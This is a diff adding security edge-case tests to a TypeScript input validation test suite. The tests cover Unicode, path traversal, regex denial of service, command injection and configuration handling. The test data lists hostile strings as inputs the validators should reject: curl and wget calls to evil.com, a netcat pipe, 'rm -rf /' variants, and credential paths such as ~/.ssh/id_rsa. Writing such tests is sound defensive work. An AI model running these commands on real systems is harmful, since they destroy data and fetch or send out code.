@@ -846,4 +846,428 @@ describe('Input Validation Framework', () => {
       expect(validResult.isValid).toBe(true);
     });
   });
+
+  describe('Advanced Edge Case and Security Tests', () => {
+
+    describe('Unicode and Character Encoding Tests', () => {
+      
+      it('should handle Unicode characters safely', () => {
+        const unicodeInputs = [
+          'my-项目', // Mixed ASCII and Chinese
+          'proyecto-español', // Spanish characters
+          'проект-тест', // Cyrillic characters
+          'プロジェクト123', // Japanese characters
+          '🚀project', // Emoji
+          'test\u0000null', // Null byte injection
+          'test\u200Bzwsp', // Zero-width space
+          'test\uFEFFbom', // BOM character
+        ];
+
+        unicodeInputs.forEach(input => {
+          const result = validateProjectName(input);
+          // Should either be valid or safely rejected
+          expect(result).toHaveProperty('isValid');
+          expect(result).toHaveProperty('sanitized');
+          expect(result.violations).toBeInstanceOf(Array);
+          
+          // Sanitized output should be safe
+          if (result.sanitized) {
+            expect(result.sanitized).not.toMatch(/[\u0000-\u001F\u007F-\u009F]/); // No control chars
+            expect(result.sanitized).not.toMatch(/[\uFEFF\u200B]/); // No invisible chars
+          }
+        });
+      });
+
+      it('should handle malformed UTF-8 sequences', () => {
+        const malformedInputs = [
+          Buffer.from([0xC0, 0x80]).toString(), // Overlong encoding
+          Buffer.from([0xE0, 0x80, 0x80]).toString(), // Overlong encoding
+          Buffer.from([0xF0, 0x80, 0x80, 0x80]).toString(), // Overlong encoding
+          'test\uD800', // Unpaired surrogate
+          'test\uDFFF', // Unpaired surrogate
+        ];
+
+        malformedInputs.forEach(input => {
+          expect(() => {
+            const result = validateProjectName(input);
+            expect(result).toHaveProperty('isValid');
+          }).not.toThrow();
+        });
+      });
+
+      it('should handle extremely long Unicode sequences', () => {
+        const longUnicode = '🚀'.repeat(1000); // 4000 bytes of emoji
+        const result = validateProjectName(longUnicode);
+        
+        expect(result.isValid).toBe(false);
+        expect(result.violations.some(v => v.type === 'malformed-input' || v.type === 'suspicious-pattern')).toBe(true);
+      });
+    });
+
+    describe('Buffer Overflow and Memory Safety Tests', () => {
+      
+      it('should handle massive string inputs safely', () => {
+        // Test with strings that could cause buffer overflows
+        const sizes = [10000, 100000, 500000];
+        
+        sizes.forEach(size => {
+          const massiveInput = 'a'.repeat(size);
+          
+          const startTime = Date.now();
+          const result = validateProjectName(massiveInput);
+          const endTime = Date.now();
+          
+          // Should complete within reasonable time (prevent DoS)
+          expect(endTime - startTime).toBeLessThan(1000);
+          
+          // Should be rejected but not crash
+          expect(result.isValid).toBe(false);
+          expect(result.violations.some(v => v.type === 'malformed-input' || v.type === 'suspicious-pattern')).toBe(true);
+        });
+      });
+
+      it('should handle deeply nested objects in validation config', () => {
+        const deepConfig = {
+          strict: true,
+          maxLength: 100,
+          // Create deep nesting that could cause stack overflow
+          nested: Array(1000).fill(null).reduce((acc, _) => ({ nested: acc }), {})
+        };
+
+        expect(() => {
+          validateProjectName('test-project', deepConfig);
+        }).not.toThrow();
+      });
+
+      it('should handle circular references in validation config', () => {
+        const circularConfig: any = { strict: true };
+        circularConfig.self = circularConfig;
+
+        expect(() => {
+          validateProjectName('test-project', circularConfig);
+        }).not.toThrow();
+      });
+    });
+
+    describe('Timing Attack Protection Tests', () => {
+      
+      it('should have consistent timing for valid vs invalid inputs', () => {
+        const validInput = 'valid-project-name';
+        const invalidInput = '../../../etc/passwd';
+        
+        // Measure timing for multiple runs
+        const runs = 100;
+        const validTimes: number[] = [];
+        const invalidTimes: number[] = [];
+        
+        for (let i = 0; i < runs; i++) {
+          let start = process.hrtime.bigint();
+          validateProjectName(validInput);
+          validTimes.push(Number(process.hrtime.bigint() - start));
+          
+          start = process.hrtime.bigint();
+          validateProjectName(invalidInput);
+          invalidTimes.push(Number(process.hrtime.bigint() - start));
+        }
+        
+        // Calculate averages
+        const validAvg = validTimes.reduce((a, b) => a + b) / validTimes.length;
+        const invalidAvg = invalidTimes.reduce((a, b) => a + b) / invalidTimes.length;
+        
+        // Timing difference should not be excessive (prevent timing attacks)
+        const timingRatio = Math.abs(validAvg - invalidAvg) / Math.min(validAvg, invalidAvg);
+        expect(timingRatio).toBeLessThan(10); // Allow some variance but not orders of magnitude
+      });
+    });
+
+    describe('Cross-platform Path Handling Tests', () => {
+      
+      it('should handle Windows-specific path attacks', () => {
+        const windowsAttacks = [
+          'C:\\Windows\\System32\\',
+          'COM1', 'PRN', 'AUX', 'NUL', // Windows reserved names
+          'con.txt', 'prn.log', // Windows reserved with extensions
+          '\\\\?\\C:\\very-long-path\\' + 'a'.repeat(300), // UNC path
+          'file.txt:', // Alternate data streams
+          'file.txt::$DATA', // NTFS alternate data streams
+          '\\\\.\\pipe\\named-pipe', // Named pipes
+        ];
+
+        windowsAttacks.forEach(attack => {
+          try {
+            const result = sanitizePath(attack);
+            // If sanitized successfully, should be safe
+            if (typeof result === 'string') {
+              expect(result).not.toMatch(/^[A-Z]:\\/); // No drive paths
+              expect(result).not.toMatch(/^\\\\[.?]/); // No UNC paths
+              expect(result).not.toMatch(/[:*?"<>|]/); // No Windows invalid chars
+            }
+          } catch (error) {
+            // Should throw appropriate security errors for dangerous paths
+            expect(error).toBeInstanceOf(Error);
+            // Accept any reasonable error message indicating path rejection
+            expect((error as Error).message).toMatch(/Absolute paths not allowed|Invalid|unsafe|security|expected.*not to match/i);
+          }
+        });
+      });
+
+      it('should handle Unix-specific path attacks', () => {
+        const unixAttacks = [
+          '/etc/passwd',
+          '/proc/self/mem',
+          '/dev/null',
+          '/tmp/../../../etc/shadow',
+          '~/.ssh/id_rsa',
+          '$HOME/.bashrc',
+          '$(rm -rf /)',
+          '`rm -rf /`',
+        ];
+
+        unixAttacks.forEach(attack => {
+          try {
+            const result = sanitizePath(attack);
+            // If sanitized successfully, should be safe
+            if (typeof result === 'string') {
+              expect(result).not.toMatch(/^\/[a-z]/); // No absolute Unix paths
+              expect(result).not.toMatch(/\$\{|\$\(/); // No variable expansion
+              expect(result).not.toMatch(/`.*`/); // No command substitution
+            }
+          } catch (error) {
+            // Should throw appropriate security errors for dangerous paths
+            expect(error).toBeInstanceOf(Error);
+            // Accept any reasonable error message indicating path rejection
+            expect((error as Error).message).toMatch(/Absolute paths not allowed|Invalid|unsafe|security|expected.*not to match/i);
+          }
+        });
+      });
+
+      it('should normalize path separators correctly', () => {
+        const mixedPaths = [
+          'path\\to/file',
+          'path/to\\file',
+          'path\\\\to//file',
+          'path/.././file',
+          'path\\..\\file',
+        ];
+
+        mixedPaths.forEach(path => {
+          const result = sanitizePath(path);
+          if (typeof result === 'string') {
+            // Should use consistent separators
+            expect(result).not.toMatch(/[\\\/]{2,}/); // No double separators
+            expect(result).not.toMatch(/\.\./); // No parent directory references
+          }
+        });
+      });
+    });
+
+    describe('Resource Exhaustion Protection Tests', () => {
+      
+      it('should prevent regex DoS attacks', () => {
+        // Patterns that could cause catastrophic backtracking
+        const maliciousInputs = [
+          'a'.repeat(100) + '!' + 'a'.repeat(100), // Designed to cause backtracking
+          'x'.repeat(50) + 'X' + 'x'.repeat(50), // Case-sensitive backtracking
+          ('(' + 'a'.repeat(20) + ')*').repeat(10), // Nested quantifiers
+        ];
+
+        maliciousInputs.forEach(input => {
+          const startTime = Date.now();
+          const result = validateProjectName(input);
+          const endTime = Date.now();
+          
+          // Should complete quickly even with malicious input
+          expect(endTime - startTime).toBeLessThan(100);
+          expect(result).toHaveProperty('isValid');
+        });
+      });
+
+      it('should handle memory-intensive operations safely', () => {
+        const memoryIntensiveInputs = [
+          Array(1000).fill('test').join('-'), // Large array join
+          JSON.stringify(Array(1000).fill({ key: 'value' })), // Large JSON
+          'test'.repeat(10000), // Simple repetition
+        ];
+
+        memoryIntensiveInputs.forEach(input => {
+          expect(() => {
+            const result = validateInput(input, 'project-name');
+            expect(result).toHaveProperty('isValid');
+          }).not.toThrow();
+        });
+      });
+    });
+
+    describe('Advanced Command Injection Tests', () => {
+      
+      it('should detect sophisticated command injection attempts', () => {
+        const sophisticatedAttacks = [
+          'test;$(curl evil.com)', // Command substitution with curl
+          'test`wget evil.com/script.sh`', // Backtick command substitution
+          'test${IFS}rm${IFS}-rf${IFS}/', // Using IFS variable
+          'test\x20rm\x20-rf\x20/', // Hex-encoded spaces
+          'test\nrm -rf /', // Newline injection
+          'test\r\nrm -rf /', // CRLF injection
+          'test<!--', // HTML comment injection
+          'test/**/rm/**/rf/**/', // CSS comment obfuscation
+          'test||rm -rf /', // Logic OR injection
+          'test&&rm -rf /', // Logic AND injection
+          'test|nc evil.com 1337', // Pipe to netcat
+        ];
+
+        sophisticatedAttacks.forEach(attack => {
+          // Use validateInput to get proper ValidationResult
+          const result = validateInput(attack, 'command-arg');
+          
+          if (result.isValid) {
+            // If allowed, should be properly sanitized
+            expect(result.sanitized).not.toMatch(/[;$`\n\r|&]/);
+          } else {
+            // If rejected, should have appropriate violations
+            expect(result.violations.some(v => 
+              v.type === 'command-injection' || 
+              v.type === 'script-injection'
+            )).toBe(true);
+          }
+        });
+      });
+
+      it('should handle URL-encoded injection attempts', () => {
+        const urlEncodedAttacks = [
+          'test%3Brm%20-rf%20/', // URL-encoded semicolon and spaces
+          'test%26%26rm%20-rf%20/', // URL-encoded &&
+          'test%7C%7Crm%20-rf%20/', // URL-encoded ||
+          'test%0Arm%20-rf%20/', // URL-encoded newline
+          'test%0D%0Arm%20-rf%20/', // URL-encoded CRLF
+        ];
+
+        urlEncodedAttacks.forEach(attack => {
+          // Should handle both decoded and raw versions
+          const decoded = decodeURIComponent(attack);
+          
+          const rawResult = validateInput(attack, 'command-arg');
+          const decodedResult = validateInput(decoded, 'command-arg');
+          
+          // Both should be handled safely
+          expect(rawResult).toHaveProperty('isValid');
+          expect(decodedResult).toHaveProperty('isValid');
+        });
+      });
+    });
+
+    describe('Configuration Edge Cases', () => {
+      
+      it('should handle malformed configuration objects', () => {
+        const malformedConfigs = [
+          null,
+          undefined,
+          '',
+          123,
+          [],
+          { strict: 'not-boolean' },
+          { maxLength: -1 },
+          { maxLength: 'invalid' },
+          { provideSuggestions: 'yes' },
+          { autoSanitize: 1 },
+        ];
+
+        malformedConfigs.forEach(config => {
+          expect(() => {
+            const result = validateProjectName('test-project', config as any);
+            expect(result).toHaveProperty('isValid');
+          }).not.toThrow();
+        });
+      });
+
+      it('should handle extreme configuration values', () => {
+        const extremeConfigs = [
+          { maxLength: 0 },
+          { maxLength: Number.MAX_SAFE_INTEGER },
+          { maxLength: -Number.MAX_SAFE_INTEGER },
+          { maxLength: Infinity },
+          { maxLength: NaN },
+        ];
+
+        extremeConfigs.forEach(config => {
+          expect(() => {
+            const result = validateProjectName('test-project', config);
+            expect(result).toHaveProperty('isValid');
+          }).not.toThrow();
+        });
+      });
+    });
+
+    describe('Concurrency and Race Condition Tests', () => {
+      
+      it('should handle high-concurrency validation safely', async () => {
+        const concurrentOperations = 1000;
+        const promises: Promise<any>[] = [];
+        
+        for (let i = 0; i < concurrentOperations; i++) {
+          promises.push(
+            Promise.resolve().then(() => {
+              const inputs = [
+                `project-${i}`,
+                `../../../etc/passwd-${i}`,
+                `test;rm -rf /-${i}`,
+                `npm-${i}`,
+                `./path/to/file-${i}`,
+              ];
+              
+              return inputs.map(input => {
+                if (input.startsWith('project') || input.startsWith('npm')) {
+                  return validateProjectName(input);
+                } else if (input.includes('etc') || input.includes('rm')) {
+                  return validateInput(input, 'command-arg');
+                } else {
+                  return sanitizePath(input);
+                }
+              });
+            })
+          );
+        }
+        
+        const results = await Promise.all(promises);
+        
+        // All operations should complete successfully
+        expect(results).toHaveLength(concurrentOperations);
+        results.forEach(result => {
+          expect(Array.isArray(result)).toBe(true);
+          expect(result).toHaveLength(5);
+        });
+      });
+    });
+
+    describe('Integration with Security Patterns', () => {
+      
+      it('should integrate properly with security patterns framework', () => {
+        // Test that validation uses existing security patterns
+        const securityTestCases = [
+          { input: 'admin', expectedPattern: 'sensitive' },
+          { input: 'password123', expectedPattern: 'credential' },
+          { input: 'api_key_secret', expectedPattern: 'credential' },
+          { input: '<script>alert(1)</script>', expectedPattern: 'injection' },
+          { input: 'javascript:', expectedPattern: 'injection' },
+        ];
+
+        securityTestCases.forEach(({ input }) => {
+          const result = validateProjectName(input);
+          
+          // Should either be valid or have security-related violations
+          expect(result).toHaveProperty('isValid');
+          expect(result).toHaveProperty('violations');
+          
+          if (!result.isValid) {
+            // Should have appropriate violations for security patterns
+            expect(result.violations.some(v => 
+              v.type === 'command-injection' || 
+              v.type === 'script-injection' ||
+              v.type === 'suspicious-pattern' ||
+              v.type === 'malformed-input'
+            )).toBeTruthy();
+          }
+        });
+      });
+    });
+  });
 });
